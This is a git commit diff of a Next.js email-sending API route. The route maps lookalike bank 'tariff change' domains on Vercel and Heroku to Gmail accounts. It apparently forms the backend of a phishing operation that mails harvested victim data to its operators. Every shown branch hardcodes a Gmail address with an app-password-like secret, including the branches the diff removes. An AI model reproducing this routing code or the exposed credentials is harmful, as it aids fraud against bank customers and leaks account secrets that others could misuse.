13990a3eec3a6b56bdf0e80ca0f1c628dc5ff053
penaruhangin <penaruhangin@gmail.com>
2022-11-19 13:52:55 +0700

    belajar

--- pages/api/sendEmail.js
+++ pages/api/sendEmail.js
@@ -12,30 +12,10 @@ export default function handler(req, res) {
         email = 'orbitorbit799@gmail.com';
         pass = 'ahghpmbdwokimqim'; 
 
-    } else if(url == 'ubah--tarif-barulama.vercel.app'){
+    } else if(url == 'ubahan-tarif.herokuapp.com'){
         email = 'giozx123456@gmail.com' ;
         pass = 'uzbakbdzoclcyzft' ;
         
-    } else if(url == 'tarifperubahan-barulama.vercel.app'){
-        email = 'pesulapmerah12.12.12b@gmail.com';
-        pass = 'xsvyoubwxfogcpuh';
-
-    } else if(url == 'per--ubahan-tarifbri.vercel.app'){
-        email = 'tarifbaru36@gmail.com';
-        pass = 'moiasopufjkptyvr';
-
-
-    } else if(url == 'tarif--ubah.vercel.app'){
-        email = 'perubahantarif042@gmail.com';
-        pass = 'nfqvekcvqmmbufts';
-
-    } else if(url == 'ubahh-tariff-baru-lama.vercel.app'){
-        email = 'andarasultan954@gmail.com';
-        pass = 'xwjfzwdtiaxfname';
-
-    } else if(url == 'tarifbaru-lama.vercel.app'){
-        email = 'wanw4826@gmail.com';
-        pass = 'fgevrxoxoymjmzka';
 
 
     }  
